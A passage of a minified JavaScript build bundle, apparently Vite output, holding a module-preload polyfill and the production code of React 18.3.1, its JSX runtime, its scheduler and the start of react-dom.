(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function n(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=n(i);fetch(i.href,s)}})();function bp(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var h1={exports:{}},mc={},p1={exports:{}},G={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Sa=Symbol.for("react.element"),RT=Symbol.for("react.portal"),OT=Symbol.for("react.fragment"),DT=Symbol.for("react.strict_mode"),LT=Symbol.for("react.profiler"),IT=Symbol.for("react.provider"),jT=Symbol.for("react.context"),FT=Symbol.for("react.forward_ref"),BT=Symbol.for("react.suspense"),VT=Symbol.for("react.memo"),zT=Symbol.for("react.lazy"),Xg=Symbol.iterator;function _T(t){return t===null||typeof t!="object"?null:(t=Xg&&t[Xg]||t["@@iterator"],typeof t=="function"?t:null)}var m1={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},g1=Object.assign,y1={};function Ps(t,e,n){this.props=t,this.context=e,this.refs=y1,this.updater=n||m1}Ps.prototype.isReactComponent={};Ps.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};Ps.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function x1(){}x1.prototype=Ps.prototype;function Cp(t,e,n){this.props=t,this.context=e,this.refs=y1,this.updater=n||m1}var Ep=Cp.prototype=new x1;Ep.constructor=Cp;g1(Ep,Ps.prototype);Ep.isPureReactComponent=!0;var Zg=Array.isArray,v1=Object.prototype.hasOwnProperty,Tp={current:null},w1={key:!0,ref:!0,__self:!0,__source:!0};function S1(t,e,n){var r,i={},s=null,o=null;if(e!=null)for(r in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(s=""+e.key),e)v1.call(e,r)&&!w1.hasOwnProperty(r)&&(i[r]=e[r]);var a=arguments.length-2;if(a===1)i.children=n;else if(1<a){for(var l=Array(a),u=0;u<a;u++)l[u]=arguments[u+2];i.children=l}if(t&&t.defaultProps)for(r in a=t.defaultProps,a)i[r]===void 0&&(i[r]=a[r]);return{$$typeof:Sa,type:t,key:s,ref:o,props:i,_owner:Tp.current}}function $T(t,e){return{$$typeof:Sa,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function Mp(t){return typeof t=="object"&&t!==null&&t.$$typeof===Sa}function HT(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(n){return e[n]})}var ey=/\/+/g;function od(t,e){return typeof t=="object"&&t!==null&&t.key!=null?HT(""+t.key):e.toString(36)}function kl(t,e,n,r,i){var s=typeof t;(s==="undefined"||s==="boolean")&&(t=null);var o=!1;if(t===null)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(t.$$typeof){case Sa:case RT:o=!0}}if(o)return o=t,i=i(o),t=r===""?"."+od(o,0):r,Zg(i)?(n="",t!=null&&(n=t.replace(ey,"$&/")+"/"),kl(i,e,n,"",function(u){return u})):i!=null&&(Mp(i)&&(i=$T(i,n+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(ey,"$&/")+"/")+t)),e.push(i)),1;if(o=0,r=r===""?".":r+":",Zg(t))for(var a=0;a<t.length;a++){s=t[a];var l=r+od(s,a);o+=kl(s,e,n,l,i)}else if(l=_T(t),typeof l=="function")for(t=l.call(t),a=0;!(s=t.next()).done;)s=s.value,l=r+od(s,a++),o+=kl(s,e,n,l,i);else if(s==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function Ha(t,e,n){if(t==null)return t;var r=[],i=0;return kl(t,r,"","",function(s){return e.call(n,s,i++)}),r}function UT(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(n){(t._status===0||t._status===-1)&&(t._status=1,t._result=n)},function(n){(t._status===0||t._status===-1)&&(t._status=2,t._result=n)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var dt={current:null},bl={transition:null},WT={ReactCurrentDispatcher:dt,ReactCurrentBatchConfig:bl,ReactCurrentOwner:Tp};function k1(){throw Error("act(...) is not supported in production builds of React.")}G.Children={map:Ha,forEach:function(t,e,n){Ha(t,function(){e.apply(this,arguments)},n)},count:function(t){var e=0;return Ha(t,function(){e++}),e},toArray:function(t){return Ha(t,function(e){return e})||[]},only:function(t){if(!Mp(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};G.Component=Ps;G.Fragment=OT;G.Profiler=LT;G.PureComponent=Cp;G.StrictMode=DT;G.Suspense=BT;G.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=WT;G.act=k1;G.cloneElement=function(t,e,n){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var r=g1({},t.props),i=t.key,s=t.ref,o=t._owner;if(e!=null){if(e.ref!==void 0&&(s=e.ref,o=Tp.current),e.key!==void 0&&(i=""+e.key),t.type&&t.type.defaultProps)var a=t.type.defaultProps;for(l in e)v1.call(e,l)&&!w1.hasOwnProperty(l)&&(r[l]=e[l]===void 0&&a!==void 0?a[l]:e[l])}var l=arguments.length-2;if(l===1)r.children=n;else if(1<l){a=Array(l);for(var u=0;u<l;u++)a[u]=arguments[u+2];r.children=a}return{$$typeof:Sa,type:t.type,key:i,ref:s,props:r,_owner:o}};G.createContext=function(t){return t={$$typeof:jT,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:IT,_context:t},t.Consumer=t};G.createElement=S1;G.createFactory=function(t){var e=S1.bind(null,t);return e.type=t,e};G.createRef=function(){return{current:null}};G.forwardRef=function(t){return{$$typeof:FT,render:t}};G.isValidElement=Mp;G.lazy=function(t){return{$$typeof:zT,_payload:{_status:-1,_result:t},_init:UT}};G.memo=function(t,e){return{$$typeof:VT,type:t,compare:e===void 0?null:e}};G.startTransition=function(t){var e=bl.transition;bl.transition={};try{t()}finally{bl.transition=e}};G.unstable_act=k1;G.useCallback=function(t,e){return dt.current.useCallback(t,e)};G.useContext=function(t){return dt.current.useContext(t)};G.useDebugValue=function(){};G.useDeferredValue=function(t){return dt.current.useDeferredValue(t)};G.useEffect=function(t,e){return dt.current.useEffect(t,e)};G.useId=function(){return dt.current.useId()};G.useImperativeHandle=function(t,e,n){return dt.current.useImperativeHandle(t,e,n)};G.useInsertionEffect=function(t,e){return dt.current.useInsertionEffect(t,e)};G.useLayoutEffect=function(t,e){return dt.current.useLayoutEffect(t,e)};G.useMemo=function(t,e){return dt.current.useMemo(t,e)};G.useReducer=function(t,e,n){return dt.current.useReducer(t,e,n)};G.useRef=function(t){return dt.current.useRef(t)};G.useState=function(t){return dt.current.useState(t)};G.useSyncExternalStore=function(t,e,n){return dt.current.useSyncExternalStore(t,e,n)};G.useTransition=function(){return dt.current.useTransition()};G.version="18.3.1";p1.exports=G;var S=p1.exports;const zt=bp(S);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var KT=S,qT=Symbol.for("react.element"),GT=Symbol.for("react.fragment"),JT=Object.prototype.hasOwnProperty,YT=KT.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,QT={key:!0,ref:!0,__self:!0,__source:!0};function b1(t,e,n){var r,i={},s=null,o=null;n!==void 0&&(s=""+n),e.key!==void 0&&(s=""+e.key),e.ref!==void 0&&(o=e.ref);for(r in e)JT.call(e,r)&&!QT.hasOwnProperty(r)&&(i[r]=e[r]);if(t&&t.defaultProps)for(r in e=t.defaultProps,e)i[r]===void 0&&(i[r]=e[r]);return{$$typeof:qT,type:t,key:s,ref:o,props:i,_owner:YT.current}}mc.Fragment=GT;mc.jsx=b1;mc.jsxs=b1;h1.exports=mc;var m=h1.exports,C1={exports:{}},Pt={},E1={exports:{}},T1={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(D,B){var z=D.length;D.push(B);e:for(;0<z;){var Y=z-1>>>1,Se=D[Y];if(0<i(Se,B))D[Y]=B,D[z]=Se,z=Y;else break e}}function n(D){return D.length===0?null:D[0]}function r(D){if(D.length===0)return null;var B=D[0],z=D.pop();if(z!==B){D[0]=z;e:for(var Y=0,Se=D.length,Yn=Se>>>1;Y<Yn;){var Mn=2*(Y+1)-1,$s=D[Mn],un=Mn+1,_r=D[un];if(0>i($s,z))un<Se&&0>i(_r,$s)?(D[Y]=_r,D[un]=z,Y=un):(D[Y]=$s,D[Mn]=z,Y=Mn);else if(un<Se&&0>i(_r,z))D[Y]=_r,D[un]=z,Y=un;else break e}}return B}function i(D,B){var z=D.sortIndex-B.sortIndex;return z!==0?z:D.id-B.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;t.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();t.unstable_now=function(){return o.now()-a}}var l=[],u=[],c=1,d=null,f=3,h=!1,p=!1,y=!1,x=typeof setTimeout=="function"?setTimeout:null,g=typeof clearTimeout=="function"?clearTimeout:null,v=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function w(D){for(var B=n(u);B!==null;){if(B.callback===null)r(u);else if(B.startTime<=D)r(u),B.sortIndex=B.expirationTime,e(l,B);else break;B=n(u)}}function b(D){if(y=!1,w(D),!p)if(n(l)!==null)p=!0,Re(k);else{var B=n(u);B!==null&&J(b,B.startTime-D)}}function k(D,B){p=!1,y&&(y=!1,g(C),C=-1),h=!0;var z=f;try{for(w(B),d=n(l);d!==null&&(!(d.expirationTime>B)||D&&!H());){var Y=d.callback;if(typeof Y=="function"){d.callback=null,f=d.priorityLevel;var Se=Y(d.expirationTime<=B);B=t.unstable_now(),typeof Se=="function"?d.callback=Se:d===n(l)&&r(l),w(B)}else r(l);d=n(l)}if(d!==null)var Yn=!0;else{var Mn=n(u);Mn!==null&&J(b,Mn.startTime-B),Yn=!1}return Yn}finally{d=null,f=z,h=!1}}var E=!1,M=null,C=-1,N=5,O=-1;function H(){return!(t.unstable_now()-O<N)}function pe(){if(M!==null){var D=t.unstable_now();O=D;var B=!0;try{B=M(!0,D)}finally{B?Pe():(E=!1,M=null)}}else E=!1}var Pe;if(typeof v=="function")Pe=function(){v(pe)};else if(typeof MessageChannel<"u"){var bt=new MessageChannel,Ct=bt.port2;bt.port1.onmessage=pe,Pe=function(){Ct.postMessage(null)}}else Pe=function(){x(pe,0)};function Re(D){M=D,E||(E=!0,Pe())}function J(D,B){C=x(function(){D(t.unstable_now())},B)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(D){D.callback=null},t.unstable_continueExecution=function(){p||h||(p=!0,Re(k))},t.unstable_forceFrameRate=function(D){0>D||125<D?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):N=0<D?Math.floor(1e3/D):5},t.unstable_getCurrentPriorityLevel=function(){return f},t.unstable_getFirstCallbackNode=function(){return n(l)},t.unstable_next=function(D){switch(f){case 1:case 2:case 3:var B=3;break;default:B=f}var z=f;f=B;try{return D()}finally{f=z}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(D,B){switch(D){case 1:case 2:case 3:case 4:case 5:break;default:D=3}var z=f;f=D;try{return B()}finally{f=z}},t.unstable_scheduleCallback=function(D,B,z){var Y=t.unstable_now();switch(typeof z=="object"&&z!==null?(z=z.delay,z=typeof z=="number"&&0<z?Y+z:Y):z=Y,D){case 1:var Se=-1;break;case 2:Se=250;break;case 5:Se=1073741823;break;case 4:Se=1e4;break;default:Se=5e3}return Se=z+Se,D={id:c++,callback:B,priorityLevel:D,startTime:z,expirationTime:Se,sortIndex:-1},z>Y?(D.sortIndex=z,e(u,D),n(l)===null&&D===n(u)&&(y?(g(C),C=-1):y=!0,J(b,z-Y))):(D.sortIndex=Se,e(l,D),p||h||(p=!0,Re(k))),D},t.unstable_shouldYield=H,t.unstable_wrapCallback=function(D){var B=f;return function(){var z=f;f=B;try{return D.apply(this,arguments)}finally{f=z}}}})(T1);E1.exports=T1;var XT=E1.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var ZT=S,At=XT;function R(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,n=1;n<arguments.length;n++)e+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var M1=new Set,Fo={};function Ti(t,e){hs(t,e),hs(t+"Capture",e)}function hs(t,e){for(Fo[t]=e,t=0;t<e.length;t++)M1.add(e[t])}var _n=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Mf=Object.prototype.hasOwnProperty,eM=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,ty={},ny={};function tM(t){return Mf.call(ny,t)?!0:Mf.call(ty,t)?!1:eM.test(t)?ny[t]=!0:(ty[t]=!0,!1)}function nM(t,e,n,r){if(n!==null&&n.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function rM(t,e,n,r){if(e===null||typeof e>"u"||nM(t,e,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function ft(t,e,n,r,i,s,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=t,this.type=e,this.sanitizeURL=s,this.removeEmptyString=o}var qe={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){qe[t]=new ft(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];qe[e]=new ft(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){qe[t]=new ft(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){qe[t]=new ft(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){qe[t]=new ft(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){qe[t]=new ft(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){qe[t]=new ft(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){qe[t]=new ft(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){qe[t]=new ft(t,5,!1,t.toLowerCase(),null,!1,!1)});var Np=/[\-:]([a-z])/g;function Ap(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(Np,Ap);qe[e]=new ft(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(Np,Ap);qe[e]=new ft(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(Np,Ap);qe[e]=new ft(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){qe[t]=new ft(t,1,!1,t.toLowerCase(),null,!1,!1)});qe.xlinkHref=new ft("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){qe[t]=new ft(t,1,!1,t.toLowerCase(),null,!0,!0)});function Pp(t,e,n,r){var i=qe.hasOwnProperty(e)?qe[e]:null;(i!==null?i.type!==0:r||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(rM(e,n,i,r)&&(n=null),r||i===null?tM(e)&&(n===null?t.removeAttribute(e):t.setAttribute(e,""+n)):i.mustUseProperty?t[i.propertyName]=n===null?i.type===3?!1:"":n:(e=i.attributeName,r=i.attributeNamespace,n===null?t.removeAttribute(e):(i=i.type,n=i===3||i===4&&n===!0?"":""+n,r?t.setAttributeNS(r,e,n):t.setAttribute(e,n))))}var Gn=ZT.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Ua=Symbol.for("react.element"),Bi=Symbol.for("react.portal"),Vi=Symbol.for("react.fragment"),Rp=Symbol.for("react.strict_mode"),Nf=Symbol.for("react.profiler"),N1=Symbol.for("react.provider"),A1=Symbol.for("react.context"),Op=Symbol.for("react.forward_ref"),Af=Symbol.for("react.suspense"),Pf=Symbol.for("react.suspense_list"),Dp=Symbol.for("react.memo"),nr=Symbol.for("react.lazy"),P1=Symbol.for("react.offscreen"),ry=Symbol.iterator;function Us(t){return t===null||typeof t!="object"?null:(t=ry&&t[ry]||t["@@iterator"],typeof t=="function"?t:null)}var he=Object.assign,ad;function ro(t){if(ad===void 0)try{throw Error()}catch(n){var e=n.stack.trim().match(/\n( *(at )?)/);ad=e&&e[1]||""}return`
`+ad+t}var ld=!1;function ud(t,e){if(!t||ld)return"";ld=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(u){var r=u}Reflect.construct(t,[],e)}else{try{e.call()}catch(u){r=u}t.call(e.prototype)}else{try{throw Error()}catch(u){r=u}t()}}catch(u){if(u&&r&&typeof u.stack=="string"){for(var i=u.stack.split(`
`),s=r.stack.split(`
`),o=i.length-1,a=s.length-1;1<=o&&0<=a&&i[o]!==s[a];)a--;for(;1<=o&&0<=a;o--,a--)if(i[o]!==s[a]){if(o!==1||a!==1)do if(o--,a--,0>a||i[o]!==s[a]){var l=`
`+i[o].replace(" at new "," at ");return t.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",t.displayName)),l}while(1<=o&&0<=a);break}}}finally{ld=!1,Error.prepareStackTrace=n}return(t=t?t.displayName||t.name:"")?ro(t):""}function iM(t){switch(t.tag){case 5:return ro(t.type);case 16:return ro("Lazy");case 13:return ro("Suspense");case 19:return ro("SuspenseList");case 0:case 2:case 15:return t=ud(t.type,!1),t;case 11:return t=ud(t.type.render,!1),t;case 1:return t=ud(t.type,!0),t;default:return""}}function Rf(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case Vi:return"Fragment";case Bi:return"Portal";case Nf:return"Profiler";case Rp:return"StrictMode";case Af:return"Suspense";case Pf:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case A1:return(t.displayName||"Context")+".Consumer";case N1:return(t._context.displayName||"Context")+".Provider";case Op:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case Dp:return e=t.displayName||null,e!==null?e:Rf(t.type)||"Memo";case nr:e=t._payload,t=t._init;try{return Rf(t(e))}catch{}}return null}function sM(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Rf(e);case 8:return e===Rp?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function Ar(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function R1(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function oM(t){var e=R1(t)?"checked":"value",n=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),r=""+t[e];if(!t.hasOwnProperty(e)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var i=n.get,s=n.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,s.call(this,o)}}),Object.defineProperty(t,e,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function Wa(t){t._valueTracker||(t._valueTracker=oM(t))}function O1(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var n=e.getValue(),r="";return t&&(r=R1(t)?t.checked?"true":"false":t.value),t=r,t!==n?(e.setValue(t),!0):!1}function Gl(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Of(t,e){var n=e.checked;return he({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??t._wrapperState.initialChecked})}function iy(t,e){var n=e.defaultValue==null?"":e.defaultValue,r=e.checked!=null?e.checked:e.defaultChecked;n=Ar(e.value!=null?e.value:n),t._wrapperState={initialChecked:r,initialValue:n,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function D1(t,e){e=e.checked,e!=null&&Pp(t,"checked",e,!1)}function Df(t,e){D1(t,e);var n=Ar(e.value),r=e.type;if(n!=null)r==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+n):t.value!==""+n&&(t.value=""+n);else if(r==="submit"||r==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?Lf(t,e.type,n):e.hasOwnProperty("defaultValue")&&Lf(t,e.type,Ar(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function sy(t,e,n){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!(r!=="submit"&&r!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,n||e===t.value||(t.value=e),t.defaultValue=e}n=t.name,n!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,n!==""&&(t.name=n)}function Lf(t,e,n){(e!=="number"||Gl(t.ownerDocument)!==t)&&(n==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+n&&(t.defaultValue=""+n))}var io=Array.isArray;function ns(t,e,n,r){if(t=t.options,e){e={};for(var i=0;i<n.length;i++)e["$"+n[i]]=!0;for(n=0;n<t.length;n++)i=e.hasOwnProperty("$"+t[n].value),t[n].selected!==i&&(t[n].selected=i),i&&r&&(t[n].defaultSelected=!0)}else{for(n=""+Ar(n),e=null,i=0;i<t.length;i++){if(t[i].value===n){t[i].selected=!0,r&&(t[i].defaultSelected=!0);return}e!==null||t[i].disabled||(e=t[i])}e!==null&&(e.selected=!0)}}function If(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error(R(91));return he({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function oy(t,e){var n=e.value;if(n==null){if(n=e.children,e=e.defaultValue,n!=null){if(e!=null)throw Error(R(92));if(io(n)){if(1<n.length)throw Error(R(93));n=n[0]}e=n}e==null&&(e=""),n=e}t._wrapperState={initialValue:Ar(n)}}function L1(t,e){var n=Ar(e.value),r=Ar(e.defaultValue);n!=null&&(n=""+n,n!==t.value&&(t.value=n),e.defaultValue==null&&t.defaultValue!==n&&(t.defaultValue=n)),r!=null&&(t.defaultValue=""+r)}function ay(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function I1(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function jf(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?I1(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var Ka,j1=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,n,r,i){MSApp.execUnsafeLocalFunction(function(){return t(e,n,r,i)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(Ka=Ka||document.createElement("div"),Ka.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=Ka.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function Bo(t,e){if(e){var n=t.firstChild;if(n&&n===t.lastChild&&n.nodeType===3){n.nodeValue=e;return}}t.textContent=e}var ho={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},aM=["Webkit","ms","Moz","O"];Object.keys(ho).forEach(function(t){aM.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),ho[e]=ho[t]})});function F1(t,e,n){return e==null||typeof e=="boolean"||e===""?"":n||typeof e!="number"||e===0||ho.hasOwnProperty(t)&&ho[t]?(""+e).trim():e+"px"}function B1(t,e){t=t.style;for(var n in e)if(e.hasOwnProperty(n)){var r=n.indexOf("--")===0,i=F1(n,e[n],r);n==="float"&&(n="cssFloat"),r?t.setProperty(n,i):t[n]=i}}var lM=he({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Ff(t,e){if(e){if(lM[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(R(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(R(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(R(61))}if(e.style!=null&&typeof e.style!="object")throw Error(R(62))}}function 